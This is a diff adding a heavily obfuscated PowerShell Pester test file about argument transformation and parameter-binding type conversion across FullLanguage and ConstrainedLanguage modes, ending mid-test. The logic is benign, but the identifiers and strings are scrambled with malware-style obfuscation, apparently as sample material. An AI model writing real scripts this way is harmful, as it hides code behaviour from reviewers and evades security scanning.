@@ -1,0 +1,429 @@
+ SeT-ItEm  VaRiABLe:J9IU (  [Type]("{0}{2}{1}"-f'SYSTem.','.pATh','io')  )  ; set-itEM  ('v'+'ariAbLe'+':d'+'F96H') ([TYpE]("{0}{1}{2}"-F'pO','wErS','HeLL')); 
+
+
+&("{0}{2}{1}"-f 'Desc','ibe','r') ('Argume'+'nt'+' '+'tra'+'nsf'+'o'+'rmatio'+'n '+'at'+'t'+'ribu'+'te '+'on'+' '+'opti'+'onal '+'arg'+'umen'+'t '+'wit'+'h '+'exp'+'lic'+'it '+(('6Cbnull')  -CRePlAcE'6Cb',[CHar]36)) -Tags "CI" {
+    ${t`deF`InIT`Ion} = @'
+    using System;
+    using System.Management.Automation;
+    using System.Reflection;
+
+    namespace MSFT_1407291
+    {
+        [AttributeUsage(AttributeTargets.Property | AttributeTargets.Field, AllowMultiple = false)]
+        public class AddressTransformationAttribute : ArgumentTransformationAttribute
+        {
+            public override object Transform(EngineIntrinsics engineIntrinsics, object inputData)
+            {
+                return (ulong) 42;
+            }
+        }
+
+        [Cmdlet(VerbsLifecycle.Invoke, "CSharpCmdletTakesUInt64")]
+        [OutputType(typeof(System.String))]
+        public class Cmdlet1 : PSCmdlet
+        {
+            [Parameter(Mandatory = false)]
+            [AddressTransformation]
+            public ulong Address { get; set; }
+
+            protected override void ProcessRecord()
+            {
+                WriteObject(Address);
+            }
+        }
+
+        [Cmdlet(VerbsLifecycle.Invoke, "CSharpCmdletTakesObject")]
+        [OutputType(typeof(System.String))]
+        public class Cmdlet2 : PSCmdlet
+        {
+            [Parameter(Mandatory = false)]
+            [AddressTransformation]
+            public object Address { get; set; }
+
+            protected override void ProcessRecord()
+            {
+                WriteObject(Address ?? "passed in null");
+            }
+        }
+    }
+'@
+    ${M`Od} = &("{0}{2}{1}"-f'A','d-Type','d') -PassThru -TypeDefinition ${TD`e`FINItion}
+
+    &("{2}{3}{1}{0}" -f 'dule','-Mo','I','mport') ${M`OD}[0]."as`SEMbly" -ErrorVariable ("{3}{0}{1}{4}{2}" -f 'r','orIm','ingModule','Er','port')
+
+    function iNVOkE-S`cRi`pT`FunctiO`Nt`AK`Es`OBj`eCt
+    {
+        param([MSFT_1407291.AddressTransformation()]
+              [Parameter(maNDAtoRY = ${F`AlSE})]
+              [object]${a`DdR`ESs} = ("{3}{2}{0}{4}{1}" -f ' ','n null','assed','p','i'))
+
+        return ${AdD`ReSS}
+    }
+
+    function In`V`OKe`-sC`RipTfu`NctI`o`NTAKESU`iNT64
+    {
+        param([MSFT_1407291.AddressTransformation()]
+              [Parameter(ManDaTORY = ${F`Al`SE})]
+              [Uint64]${A`D`DreSS} = 11)
+
+        return ${Ad`dREss}
+    }
+
+    &('It') ("{14}{5}{9}{1}{7}{10}{12}{4}{13}{6}{0}{2}{11}{3}{8}"-f ' t','s n','he in-mem','modul','or',' w','g','o err','e','a','or im','ory ','p','tin','There') {
+        ${ERrORImpo`Rti`NgmO`d`ULE} | &("{0}{1}{2}" -f 'Sho','ul','d') -BeNullOrEmpty
+    }
+
+    &('It') ("{3}{5}{7}{2}{6}{4}{1}{0}" -f ' object','takes','t','S','on ','cript fu','i','nc') {
+        &("{2}{1}{7}{4}{6}{8}{0}{3}{5}" -f'j','n','I','ec','tF','t','unctionTa','voke-Scrip','kesOb') | &("{1}{0}"-f 'ld','Shou') -Be 42
+    }
+    &('It') ("{0}{2}{1}{3}{4}{5}" -f'Script fun','n t','ctio','a','kes ','uint64') {
+        &("{6}{3}{5}{2}{1}{4}{0}"-f '64','esUIn','ionTak','vok','t','e-ScriptFunct','In') | &("{0}{1}"-f'Shoul','d') -Be 42
+    }
+    &('it') ("{6}{7}{2}{3}{5}{8}{1}{4}{0}"-f'ject','takes o','p',' cmdl','b','e','csha','r','t ') {
+        &("{3}{2}{5}{6}{0}{1}{4}" -f 'rp','CmdletTak','v','In','esObject','oke-CS','ha') | &("{1}{0}"-f'ld','Shou') -Be ("{3}{2}{0}{1}" -f'ssed',' in null','a','p')
+    }
+    &('it') ("{2}{3}{0}{5}{6}{1}{7}{4}"-f ' c','es u','csh','arp','t64','mdlet ta','k','in') {
+        &("{2}{1}{3}{6}{0}{7}{4}{5}"-f'Shar','o','Inv','k','TakesUI','nt64','e-C','pCmdlet') | &("{1}{0}"-f'd','Shoul') -Be 0
+    }
+
+    &('it') ("{6}{15}{0}{8}{2}{1}{13}{4}{9}{14}{7}{5}{12}{10}{3}{11}"-f'nct','s ','take','r ','b',' ','script f','when','ion ','j','ramete','is null','pa','o','ect ','u') {
+        &("{2}{3}{9}{0}{6}{4}{1}{8}{5}{7}" -f 'Scrip','nTakes','I','nv','io','c','tFunct','t','Obje','oke-') -Address ${Nu`ll} | &("{1}{0}" -f 'uld','Sho') -Be 42
+    }
+    &('it') ("{14}{9}{6}{15}{8}{3}{10}{7}{4}{5}{1}{12}{2}{0}{11}{13}"-f'is','arame','r ','nction','s unit64 when ','p','ri','ake',' fu','c',' t',' ','te','null','s','pt') {
+        &("{0}{1}{2}{3}{4}{5}"-f'In','vok','e-Scri','ptFunctionTak','esU','Int64') -Address ${N`UlL} | &("{0}{1}{2}"-f 'Sho','u','ld') -Be 42
+    }
+    &('it') ("{7}{11}{9}{6}{8}{0}{10}{2}{4}{5}{3}{1}" -f 'ject when','er is null','p','et','ar','am','o','script csharp c','b','t takes ',' ','mdle') {
+        &("{5}{7}{6}{1}{8}{2}{3}{4}{0}" -f'ct','CSh','dlet','Takes','Obje','I','ke-','nvo','arpCm') -Address ${Nu`ll} | &("{0}{1}" -f 'Sh','ould') -Be 42
+    }
+    &('it') ("{16}{3}{10}{15}{6}{7}{4}{12}{1}{13}{2}{9}{14}{5}{11}{0}{8}" -f 'ul','4 w','e','pt csharp c','int','ameter is','k','es u','l','n ','mdlet t',' n','6','h','par','a','scri') {
+        &("{3}{1}{5}{4}{0}{2}{6}"-f'UIn','arpC','t','Invoke-CSh','kes','mdletTa','64') -Address ${n`ULl} | &("{1}{0}" -f 'ld','Shou') -Be 42
+    }
+}
+
+&("{0}{1}" -f 'Des','cribe') ("{7}{3}{1}{0}{4}{5}{6}{2}" -f'ion in','rs','binding','stom type conve',' ','paramet','er ','Cu') -Tags ("{1}{0}" -f'e','Featur') {
+    &("{1}{0}" -f'reAll','Befo') {
+        
+        ${CON`Te`Nt} = @'
+        function Test-ScriptCmdlet {
+            [CmdletBinding(DefaultParameterSetName = "File")]
+            param(
+                [Parameter(Mandatory, ParameterSetName = "File")]
+                [System.IO.FileInfo] $File,
+
+                [Parameter(Mandatory, ParameterSetName = "StartInfo")]
+                [System.Diagnostics.ProcessStartInfo] $StartInfo
+            )
+
+            if ($PSCmdlet.ParameterSetName -eq "File") {
+                $File.Name
+            } else {
+                $StartInfo.FileName
+            }
+        }
+
+        function Test-ScriptFunction {
+            param(
+                [System.IO.FileInfo] $File,
+                [System.Diagnostics.ProcessStartInfo] $StartInfo
+            )
+
+            if ($null -ne $File) {
+                $File.Name
+            }
+            if ($null -ne $StartInfo) {
+                $StartInfo.FileName
+            }
+        }
+'@
+        &("{1}{2}{0}{3}" -f 'ont','Set','-C','ent') -Path (("{3}{2}{1}{0}" -f 'e.psm1','ul','Nmod','AZITestDrive0n')).REpLacE('0nN',[strinG][ChAR]92).REpLacE(([ChAR]65+[ChAR]90+[ChAR]73),'$') -Value ${co`N`Tent} -Force
+
+        
+        ${C`OdE} = @'
+        using System.IO;
+        using System.Diagnostics;
+        using System.Management.Automation;
+
+        namespace Test
+        {
+            [Cmdlet("Test", "BinaryCmdlet", DefaultParameterSetName = "File")]
+            public class TestCmdletCommand : PSCmdlet
+            {
+                [Parameter(Mandatory = true, ParameterSetName = "File")]
+                public FileInfo File { get; set; }
+
+                [Parameter(Mandatory = true, ParameterSetName = "StartInfo")]
+                public ProcessStartInfo StartInfo { get; set; }
+
+                protected override void ProcessRecord()
+                {
+                    if (this.ParameterSetName == "File")
+                    {
+                        WriteObject(File.Name);
+                    }
+                    else
+                    {
+                        WriteObject(StartInfo.FileName);
+                    }
+                }
+            }
+        }
+'@
+        ${A`sMFI`lE} =  $j9Iu::("{2}{3}{0}{1}"-f 'l','eName','GetTemp','Fi').Invoke() + ("{1}{0}" -f'l','.dl')
+        &("{0}{2}{1}" -f 'Add','pe','-Ty') -TypeDefinition ${CO`de} -OutputAssembly ${A`SM`FiLE}
+
+        
+        function E`xEC`UTe-scriPT {
+            [CmdletBinding(dEFAultpaRAmETeRsETnaMe = {"{0}{1}" -f 'Sc','ript'})]
+            param(
+                [Parameter(MandATOry)]
+                [powershell]${PS},
+
+                [Parameter(MandaTORY, ParaMEterSetnAmE = "SC`RiPt")]
+                [string]${SC`RI`pT},
+
+                [Parameter(maNDatory, parAmETErSetnaME = "COm`mANd")]
+                [string]${C`OMM`And},
+
+                [Parameter(MAnDatoRY, PaRamEtERsETnaMe = "cOMM`AND")]
+                [string]${p`ARamEt`erNAMe},
+
+                [Parameter(MAnDaTory, pAraMETeRsEtNaMe = "Co`MmaND")]
+                [object]${argUMe`Nt}
+            )
+            ${p`s}."cOMM`AN`ds".("{1}{0}" -f 'ear','Cl').Invoke()
+            ${pS}."s`TREaMS".("{1}{0}{2}"-f 'r','Clea','Streams').Invoke()
+
+            if (${p`Sc`MdLEt}.pARAMEtersetnaME -eq ("{1}{0}" -f't','Scrip')) {
+                ${P`s}.("{2}{1}{0}"-f'cript','ddS','A').Invoke(${S`CrI`pT})."i`N`VoKe"()
+            } else {
+                ${p`s}.("{2}{1}{0}{3}" -f'mm','ddCo','A','and').Invoke(${co`MMa`ND}).("{1}{0}{2}"-f'te','AddParame','r').Invoke(${P`AraM`ET`ErN`AmE}, ${ArG`Ume`Nt})."iN`Voke"()
+            }
+        }
+
+        
+        ${CH`An`geT`Oc`ONst`RAIn`E`DLANGuaGE} = (('{'+'0}Ex'+'e'+'cutionC'+'ontext.Sess'+'i'+'onState.Lang'+'u'+'ageMo'+'de'+' ') -F  [CHaR]36+'= '+('q'+'9WCo'+'nstrained'+'Language'+'q9W')."rEPLA`cE"('q9W',[sTRing][chAr]34))
+        ${gEtl`AnG`UagE`MoDe} = (('{0}Ex'+'ecu'+'tionContext.S'+'ess'+'ionSt'+'a'+'t'+'e'+'.L'+'a'+'n'+'guageMode')-F[chAr]36)
+        ${ImP`orT`scr`iPT`mOdulE} = ('Imp'+'ort-Module'+' '+"$TestDrive\module.psm1")
+        ${imPoR`TCsh`AR`Pm`OduLe} = ('Imp'+'o'+'rt-'+'Mo'+'dule '+"$asmFile")
+    }
+
+    &("{1}{2}{0}"-f 'l','AfterA','l') {
+        
+        
+        
+        ${EXEcuT`i`O`NconTE`xt}."SeSSIOnS`T`A`Te"."LaNg`U`AgE`mODe" = ("{3}{2}{1}{0}" -f'anguage','llL','u','F')
+    }
+
+    &('It') ("{9}{10}{13}{11}{5}{12}{0}{7}{3}{8}{1}{4}{6}{2}" -f 'sion in pa','s ','guage','bindin','allowed in','nve',' FullLan','rameter ','g i','Cust','om ty','o','r','pe c') {
+        
+        ${P`S} =   (  gI  ('v'+'a'+'riabLE:D'+'f9'+'6H')).Value::("{1}{0}"-f'reate','C').Invoke()
+        try {
+            
+            &("{2}{1}{0}{3}"-f 'te-Scr','u','Exec','ipt') -ps ${p`s} -Script ${ImPOrtSCri`p`T`mO`DULe}
+            &("{2}{0}{1}" -f 'te-Sc','ript','Execu') -ps ${P`s} -Script ${I`MPoR`T`CSHARPM`Odule}
+
+            ${l`ANG`UageMO`dE} = &("{1}{3}{2}{0}{4}" -f 'te','E','cu','xe','-Script') -ps ${p`S} -Script ${GeTla`NgUAG`Emo`De}
+            ${languA`G`e`mOde} | &("{0}{2}{1}" -f'Shou','d','l') ('Be') ("{2}{0}{1}" -f 'ullLanguag','e','F')
+
+            ${r`e`sULt1} = &("{3}{0}{4}{2}{1}" -f'c','pt','i','Execute-S','r') -ps ${p`S} -Script ("{3}{0}{8}{6}{7}{4}{9}{1}{5}{2}"-f 'est','F','e','T','ptCmdle','ile fileToUs','Scr','i','-','t -')
+            ${r`es`Ult1} | &("{0}{1}"-f 'Sho','uld') ('Be') ("{3}{0}{2}{1}" -f'ile','e','ToUs','f')
+
+            ${RES`UL`T2} = &("{1}{2}{0}{3}" -f 'ecute-S','E','x','cript') -ps ${Ps} -Script ("{3}{4}{6}{7}{5}{1}{0}{2}"-f' f','e','ileToUse','T','e','Function -Fil','st-','Script')
+            ${ReSUL`T2} | &("{0}{1}" -f 'S','hould') ('Be') ("{1}{0}" -f'oUse','fileT')
+
+            ${re`SuL`T3} = &("{1}{2}{0}" -f 't','Exec','ute-Scrip') -ps ${Ps} -Script ("{4}{5}{0}{1}{8}{6}{3}{7}{9}{2}" -f'aryC','mdl','e','-File file','Test-B','in','t ','To','e','Us')
+            ${R`eSUl`T3} | &("{1}{0}"-f 'ld','Shou') ('Be') ("{2}{0}{1}"-f'T','oUse','file')
+
+            
+            ${H`As`HVal`Ue} = @{ ("{0}{1}"-f'Fil','eName') = ("{0}{1}{2}"-f'filen','a','me'); ("{3}{2}{1}{0}"-f'ts','umen','g','Ar') = ("{0}{1}" -f 'arg','s') }
+            ${p`SOBjV`AlUE} = [PSCustomObject] ${HasHva`L`Ue}
+
+            
+            ${Re`s`Ult4} = &("{2}{3}{1}{4}{0}"-f'cript','e-','E','xecut','S') -ps ${p`S} -Command ("{0}{2}{3}{1}{4}"-f'T','-ScriptCmdl','e','st','et') -ParameterName ("{1}{0}{2}"-f 'n','StartI','fo') -Argument ${H`AsHva`luE}
+            ${R`e`SULt4} | &("{0}{1}" -f'S','hould') ('Be') ("{0}{1}{2}"-f 'fi','l','ename')
+            ${r`Esu`lt5} = &("{0}{2}{1}"-f'Exe','pt','cute-Scri') -ps ${pS} -Command ("{0}{3}{2}{1}" -f 'Tes','iptCmdlet','-Scr','t') -ParameterName ("{1}{2}{0}"-f 'fo','StartI','n') -Argument ${PS`obJ`VAlUE}
+            ${reSU`l`T5} | &("{0}{1}"-f 'S','hould') ('Be') ("{0}{1}"-f 'filen','ame')
+
+            
+            ${rEs`U`LT6} = &("{2}{1}{0}" -f'ecute-Script','x','E') -ps ${pS} -Command ("{5}{2}{1}{0}{3}{4}" -f'Func','st-Script','e','tio','n','T') -ParameterName ("{1}{0}{2}" -f 'tIn','Star','fo') -Argument ${HA`SHV`ALUE}
+            ${R`ESU`LT6} | &("{1}{0}" -f'd','Shoul') ('Be') ("{1}{0}"-f'e','filenam')
+            ${r`eS`ULT7} = &("{4}{1}{2}{3}{0}"-f'Script','x','ec','ute-','E') -ps ${PS} -Command ("{2}{1}{3}{0}" -f 'on','ptFun','Test-Scri','cti') -ParameterName ("{0}{1}{2}" -f 'Start','Inf','o') -Argument ${Psob`J`VALUe}
+            ${R`eSUl`T7} | &("{0}{1}"-f 'Sh','ould') ('Be') ("{2}{0}{1}" -f'l','ename','fi')
+
+            
+            ${rE`Su`LT8} = &("{3}{0}{1}{2}" -f'x','ecute-Sc','ript','E') -ps ${Ps} -Command ("{0}{2}{1}{3}{4}" -f 'Test','BinaryCmd','-','l','et') -ParameterName ("{2}{1}{0}" -f'rtInfo','a','St') -Argument ${haSH`V`AlUe}
+            ${reS`U`lT8} | &("{1}{0}"-f'uld','Sho') ('Be') ("{1}{0}" -f'name','file')
+            ${r`E`suLT9} = &("{1}{2}{3}{0}" -f't','Ex','ecute-','Scrip') -ps ${P`S} -Command ("{0}{1}{2}{4}{3}" -f'T','e','st-','dlet','BinaryCm') -ParameterName ("{1}{0}" -f 'rtInfo','Sta') -Argument ${PSObjv`Al`UE}
+            ${r`ESU`LT9} | &("{0}{1}{2}" -f'Sho','u','ld') ('Be') ("{1}{0}{2}" -f 'ena','fil','me')
+        }
+        finally {
+            ${pS}.("{2}{0}{1}"-f'p','ose','Dis').Invoke()
+        }
+    }
+
+    &('It') ("{10}{12}{24}{22}{15}{6}{21}{4}{19}{23}{18}{3}{25}{7}{2}{14}{26}{11}{5}{27}{1}{8}{0}{9}{13}{20}{17}{16}" -f 'rain','mdlets i','s a','t','ion in ','t','er','i','n Const','e','Some ',' trus','cu','dLa','llow','v','ge','ua','me','p','ng','s','type con','ara','stom ','er binding ','ed for','ed c') {
+        
+        ${P`s} =   ( ls  VAriable:DF96H ).vaLue::("{1}{0}" -f'eate','Cr').Invoke()
+        try {
+            
+            &("{2}{1}{3}{0}" -f'ript','ute','Exec','-Sc') -ps ${P`S} -Script ${imPortsc`RIp`TM`oduLe}
+            &("{0}{3}{1}{2}" -f 'E','ecute-Scri','pt','x') -ps ${P`s} -Script ${IM`PoRT`CSHaRpmOD`ULE}
+
+            ${L`ANGuAgemo`dE} = &("{0}{2}{3}{1}"-f'Exec','ipt','ut','e-Scr') -ps ${p`s} -Script ${Ge`TLang`UAgemO`De}
+            ${L`A`Ng`UAG`EmODe} | &("{2}{0}{1}"-f 'hou','ld','S') ('Be') ("{3}{0}{2}{1}" -f'an','age','gu','FullL')
+
+            
+            &("{1}{4}{3}{2}{0}" -f 'cript','Ex','S','te-','ecu') -ps ${pS} -Script ${CHaNGetO`cO`N`sTR`AINeDL`An`GuAge}
+            ${LAng`U`AGEmo`De} = &("{1}{0}{4}{3}{2}"-f 'ec','Ex','ipt','Scr','ute-') -ps ${p`S} -Script ${GETLAn`g`UaG`EMoDE}
+            ${LANguaG`E`m`o`dE} | &("{0}{1}{2}" -f 'Sho','u','ld') ('Be') ("{3}{4}{0}{1}{2}"-f'dLangua','g','e','Con','straine')
+
+            ${R`eS`ULT1} = &("{0}{1}{2}" -f 'E','xecute-Scrip','t') -ps ${P`S} -Script ("{1}{5}{4}{3}{6}{0}{2}"-f'le fileT','Test','oUse',' -','let','-ScriptCmd','Fi')
+            ${ReS`U`LT1} | &("{0}{1}" -f'S','hould') ('Be') ("{1}{0}{2}"-f 'Us','fileTo','e')
+
+            ${RE`s`Ult2} = &("{3}{0}{1}{2}"-f 'te-','Sc','ript','Execu') -ps ${PS} -Script ("{2}{3}{1}{4}{0}{5}"-f'Us','i','Te','st-ScriptFunct','on -File fileTo','e')
+            ${R`EsuLT2} | &("{1}{0}"-f 'uld','Sho') ('Be') ("{2}{1}{3}{0}"-f'oUse','l','fi','eT')
+
+            ${ReS`U`lt3} = &("{1}{3}{2}{0}" -f'pt','Exe','ri','cute-Sc') -ps ${p`S} -Script ("{3}{6}{0}{5}{2}{4}{1}" -f 'st-Binar','Use','let -File fileT','T','o','yCmd','e')
+            ${ResU`Lt3} | &("{1}{0}" -f'hould','S') ('Be') ("{0}{1}"-f 'fileT','oUse')
+
+            
+            
+            ${H`AShvAL`UE} = @{ ("{2}{0}{1}"-f'il','eName','F') = ("{0}{2}{1}" -f'file','me','na'); ("{2}{0}{1}" -f 'gum','ents','Ar') = ("{0}{1}"-f 'arg','s') }
+            ${Pso`BJvAL`Ue} = [PSCustomObject] ${Hashv`Al`Ue}
+
+            
+            try {
+                &("{3}{4}{0}{1}{2}" -f'S','c','ript','Execut','e-') -ps ${p`S} -Command ("{2}{0}{1}{3}"-f 't-S','c','Tes','riptCmdlet') -ParameterName ("{1}{0}{2}"-f'tartInf','S','o') -Argument ${h`AsH`Va`lue}
+                throw ("{0}{3}{6}{4}{2}{10}{1}{9}{8}{7}{5}" -f 'Expe','no','ption w','cted ','ce','own!','ex','r',' th','t','as ')
+            } catch {
+                ${_}."F`UlLYQua`L`ifiEDERrO`RId" | &("{1}{0}"-f'hould','S') ('Be') ("{10}{18}{7}{3}{14}{15}{13}{1}{16}{9}{11}{17}{0}{8}{5}{2}{12}{6}{4}"-f'n,','nsforma','u','m','ript','xec','e-Sc','ra','E','xc','P','ept','t','entTra','eterBind','ingArgum','tionE','io','a')
+            }
+
+            try {
+                &("{2}{4}{3}{0}{1}" -f'e-Scr','ipt','Exec','t','u') -ps ${P`s} -Command ("{0}{4}{3}{1}{2}"-f'Test-Sc','tCmdle','t','p','ri') -ParameterName ("{2}{0}{1}"-f'n','fo','StartI') -Argument ${PsobJv`A`LUe}
+                throw ("{1}{2}{3}{7}{5}{0}{4}{6}" -f't ','E','xpect','e','thro',' was no','wn!','d exception')
+            } catch {
+                ${_}."fUll`yQuALIfiE`dE`RRor`ID" | &("{1}{0}" -f 'ould','Sh') ('Be') ("{16}{1}{5}{9}{2}{17}{6}{18}{3}{11}{8}{15}{0}{14}{12}{4}{10}{7}{13}"-f'nExc','e','in','gumentTrans','xe','te','A','te','mati','rBind','cu','for','tion,E','-Script','ep','o','Param','g','r')
+            }
+
+            
+            try {
+                &("{4}{3}{2}{1}{0}" -f't','ip','Scr','ute-','Exec') -ps ${P`S} -Command ("{3}{0}{1}{2}" -f'est-ScriptFun','c','tion','T') -ParameterName ("{1}{2}{0}" -f'Info','Star','t') -Argument ${H`A`ShvA`LUe}
+                throw ("{2}{0}{1}{6}{3}{8}{7}{4}{5}" -f'cte','d excepti','Expe','n','thro','wn!','o','as not ',' w')
+            } catch {
+                ${_}."fUlLy`quaLIFIe`DerRor`Id" | &("{0}{1}" -f'Shou','ld') ('Be') ("{2}{7}{9}{3}{1}{11}{10}{5}{8}{4}{0}{6}"-f'e-Scrip','ra','Parame','tT','eption,Execut','Ex','t','terBindingAr','c','gumen','on','nsformati')
+            }
+
+            try {
+                &("{0}{1}{2}"-f 'Execu','te-S','cript') -ps ${Ps} -Command ("{2}{0}{1}{3}"-f 'crip','tFu','Test-S','nction') -ParameterName ("{0}{2}{1}" -f 'S','artInfo','t') -Argument ${pso`B`jvalUe}
+                throw ("{5}{2}{1}{4}{3}{0}"-f 'wn!',' exception w','ected','ro','as not th','Exp')
+            } catch {
+                ${_}."f`UL`LYquALI`FI`eDerroR`ID" | &("{0}{1}" -f 'Shou','ld') ('Be') ("{3}{4}{11}{6}{1}{13}{14}{10}{8}{2}{5}{7}{12}{9}{0}"-f't','i','ionEx','Pa','r','cepti','ind','on,Execu','mat','rip','or','ameterB','te-Sc','ngArgumentTr','ansf')
+            }
+
+            
+            try {
+                &("{1}{2}{0}{3}"-f'ip','Ex','ecute-Scr','t') -ps ${Ps} -Command ("{1}{0}{5}{4}{3}{2}" -f 't','Tes','et','yCmdl','Binar','-') -ParameterName ("{0}{1}{2}" -f'Sta','rtInf','o') -Argument ${hAs`Hv`AluE}
+                throw ("{9}{2}{3}{5}{1}{0}{4}{10}{6}{7}{8}" -f'n was ','xceptio','p','ecte','not t','d e','w','n','!','Ex','hro')
+            } catch {
+                ${_}."fuLl`yQua`lIFiEdeRR`OriD" | &("{0}{1}" -f'Shoul','d') ('Be') ("{3}{0}{4}{5}{2}{6}{1}" -f 'ndin','t','cute-','ParameterBi','gException,','Exe','Scrip')
+            }
+
+            try {
+                &("{2}{1}{0}{3}"-f 'ecu','x','E','te-Script') -ps ${P`s} -Command ("{1}{2}{3}{4}{0}"-f'et','T','est-Bina','ryCmd','l') -ParameterName ("{3}{1}{2}{0}" -f'o','n','f','StartI') -Argument ${PSOBJ`VA`LUe}
+                throw ("{3}{2}{5}{1}{4}{6}{0}" -f 'thrown!','t','ed','Expect','ion was ',' excep','not ')
+            } catch {
+                ${_}."FU`lL`YQuAlifie`d`E`RrO`RID" | &("{1}{0}" -f'ould','Sh') ('Be') ("{1}{2}{4}{3}{6}{5}{0}" -f'ipt','Param','et','dingException,Exe','erBin','r','cute-Sc')
+            }
+        }
+        finally {
+            ${p`S}.("{0}{1}" -f'Dis','pose').Invoke()
+        }
+    }
+
+    &('It') ("{1}{17}{22}{12}{13}{0}{2}{7}{16}{9}{5}{21}{19}{10}{15}{14}{11}{6}{18}{4}{20}{8}{3}"-f'rsion in parameter','Custom t',' bi','age','nstrai','fo','in ','nding','edLangu',' NOT allowed ','ted','s ','onv','e','et',' cmdl',' is','ype','Co','us','n','r untr',' c') {
+        
+        ${p`s} =   ( GEt-varIabLe ('DF96'+'H') ).ValUE::("{1}{0}" -f 'eate','Cr').Invoke()
+        try {
+            ${lan`gUA`GEMo`DE} = &("{1}{3}{4}{0}{2}" -f'te-S','Ex','cript','e','cu') -ps ${p`S} -Script ${g`eTlA`NGuAg`eMoDE}
+            ${L`ANG`Uagem`ODe} | &("{1}{0}"-f 'ld','Shou') ('Be') ("{3}{2}{1}{0}" -f'guage','lLan','ul','F')
+
+            
+            &("{2}{0}{1}{3}" -f'xecute-S','crip','E','t') -ps ${ps} -Script ${c`H`AngetOCONSTR`AiNe`DlanGua`Ge}
+            ${lAN`gUAGeM`ODE} = &("{2}{3}{0}{1}" -f 'rip','t','Execu','te-Sc') -ps ${PS} -Script ${GE`TLaNGUA`geMO`dE}
+            ${Lan`Gua`GEmOde} | &("{0}{2}{1}" -f 'Shou','d','l') ('Be') ("{0}{1}{3}{2}"-f'Co','nstrai','ge','nedLangua')
+
+            
+            &("{0}{4}{3}{2}{1}" -f 'Ex','t','p','te-Scri','ecu') -ps ${PS} -Script ${IMp`oRt`sc`RipTMOdULe}
+            &("{2}{3}{0}{1}"-f 'cute-','Script','Ex','e') -ps ${p`s} -Script ${imP`OrTC`sH`ARPMoD`Ule}
+
+            ${R`Esul`T1} = &("{3}{2}{0}{1}" -f 'ute-Scrip','t','ec','Ex') -ps ${p`s} -Script ("{1}{9}{3}{7}{8}{5}{4}{2}{6}{0}" -f 'fileToUse','Tes','e','Scri','l','-Fi',' ','ptCmdl','et ','t-')
+            ${RE`s`UlT1} | &("{2}{0}{1}" -f'ul','d','Sho') ('Be') ${n`Ull}
+            ${Ps}."St`Re`AMS"."Er`Ror"."cOu`Nt" | &("{0}{1}" -f 'S','hould') ('Be') 1
+            ${ps}."st`R`EAMS"."ErR`or"[0]."fUl`L`Y`QU`A`LIfIEDERROR`Id" | &("{2}{1}{0}" -f 'd','l','Shou') ('Be') ("{9}{0}{4}{8}{7}{1}{2}{3}{6}{5}" -f'erA','a','tionError,','Test-S','rgume','iptCmdlet','cr','orm','ntTransf','Paramet')
+
+            ${RE`SU`Lt2} = &("{0}{3}{1}{4}{2}"-f'E','te-','cript','xecu','S') -ps ${Ps} -Script ("{7}{9}{5}{2}{6}{8}{10}{1}{0}{4}{3}"-f' fileT','ion -File','r','se','oU','c','ip','T','tFunc','est-S','t')
+            ${rE`sul`T2} | &("{0}{1}" -f'Shou','ld') ('Be') ${N`ULL}
+            ${PS}."stre`Ams"."ER`RoR"."C`OunT" | &("{0}{1}"-f 'Sh','ould') ('Be') 1
+            ${p`S}."sT`REAMs"."ER`ROr"[0]."FUllyq`UAlifi`ede`Rrorid" | &("{1}{0}{2}"-f'u','Sho','ld') ('Be') ("{4}{5}{2}{7}{6}{0}{8}{3}{1}{9}"-f 'rro','ScriptFunctio','gumentT','Test-','Par','ameterAr','nE','ransformatio','r,','n')
+
+            
+            ${r`E`sUlT3} = &("{2}{0}{4}{1}{3}"-f 'xe','ut','E','e-Script','c') -ps ${ps} -Script ("{4}{1}{0}{5}{3}{2}"-f 'ina','t-B','fileToUse','t -File ','Tes','ryCmdle')
+            ${R`E`sulT3} | &("{1}{0}" -f 'ld','Shou') ('Be') ("{0}{2}{1}" -f'fil','e','eToUs')
+
+            
+            ${ha`SH`VAlUe} = @{ ("{0}{2}{1}"-f 'F','me','ileNa') = ("{0}{1}{2}" -f 'filena','m','e'); ("{2}{0}{1}" -f'rgume','nts','A') = ("{0}{1}" -f 'arg','s') }
+            ${psO`BJV`A`LuE} = [PSCustomObject] ${hAS`H`Va`lUe}
+
+            
+            try {
+                &("{0}{2}{1}{3}" -f'Execute-Sc','i','r','pt') -ps ${p`s} -Command ("{4}{1}{2}{0}{3}"-f 'iptCmd','-','Scr','let','Test') -ParameterName ("{0}{2}{1}" -f 'St','nfo','artI') -Argument ${has`H`VA`LuE}
+                throw ("{2}{4}{0}{5}{1}{3}{6}"-f'ion','t ','Expected ex','th','cept',' was no','rown!')
+            } catch {
+                ${_}."fUlLyqUALI`FIED`e`R`RoRid" | &("{1}{0}" -f 'ould','Sh') ('Be') ("{6}{4}{8}{11}{7}{5}{0}{3}{10}{9}{2}{1}"-f 'tion','cript','n,Execute-S','Exc','ndingArg','ma','ParameterBi','Transfor','u','io','ept','ment')
+            }
+
+            try {
+                &("{2}{1}{0}{3}"-f 'Sc','xecute-','E','ript') -ps ${P`S} -Command ("{4}{3}{1}{0}{2}" -f 'ptCmdl','st-Scri','et','e','T') -ParameterName ("{1}{2}{0}" -f'Info','Sta','rt') -Argument ${PSOb`jV`Alue}
+                throw ("{0}{1}{5}{2}{3}{4}" -f'Expected ','ex','t','ion was no','t thrown!','cep')
+            } catch {
+                ${_}."FuL`lYQUAl`IFieD`e`Rro`R`iD" | &("{1}{0}" -f 'uld','Sho') ('Be') ("{0}{1}{8}{6}{2}{5}{10}{9}{7}{3}{11}{4}"-f 'ParameterBi','nd','rgument','x','e-Script','Transformat','A','E','ing',',','ionException','ecut')
+            }
+
+            
+            try {
+                &("{0}{2}{1}"-f'Execute-S','ript','c') -ps ${p`s} -Command ("{3}{0}{4}{6}{2}{5}{1}" -f 't','on','p','Tes','-S','tFuncti','cri') -ParameterName ("{2}{1}{0}" -f 'fo','rtIn','Sta') -Argument ${hASH`VaL`Ue}
+                throw ("{6}{5}{0}{7}{1}{2}{3}{4}"-f 'pected ','t','ion was no','t',' thrown!','x','E','excep')
+            } catch {
+                ${_}."f`UL`L`YquALi`Fie`DeRroRID" | &("{1}{0}" -f 'ould','Sh') ('Be') ("{1}{2}{0}{9}{16}{6}{11}{4}{7}{12}{3}{5}{15}{8}{17}{13}{10}{14}"-f'indin','Par','ameterB','tio','ormationE','n,','an','xce','ecute-','gArgum','i','sf','p','r','pt','Ex','entTr','Sc')
+            }
+
+            try {
